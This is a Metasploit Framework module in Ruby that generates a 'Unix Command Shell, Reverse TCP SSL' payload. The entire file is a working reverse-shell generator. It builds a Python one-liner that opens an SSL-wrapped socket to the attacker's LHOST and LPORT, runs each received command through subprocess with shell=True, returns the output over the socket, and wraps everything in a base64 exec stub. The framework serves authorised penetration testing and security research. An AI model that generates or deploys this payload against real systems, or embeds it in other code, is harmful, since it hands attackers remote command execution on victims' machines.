##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Reverse TCP SSL (via python)',
     'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
     'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
     'License'       => BSD_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseTcpSsl,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'python',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('PythonPath', [true, 'The path to the Python executable', 'python'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = ''
    dead = Rex::Text.rand_text_alpha(2)
    # Set up the socket
    cmd += "import socket,subprocess,os,ssl\n"
    cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    cmd += "so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
    cmd += "s=ssl.wrap_socket(so)\n"
    # The actual IO
    cmd += "#{dead}=False\n"
    cmd += "while not #{dead}:\n"
    cmd += "\tdata=s.recv(1024)\n"
    cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
    cmd += "\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
    cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
    cmd += "\ts.send(stdout_value)\n"
    "#{datastore['PythonPath']} -c \"#{ py_create_exec_stub(cmd) }\""
  end
end
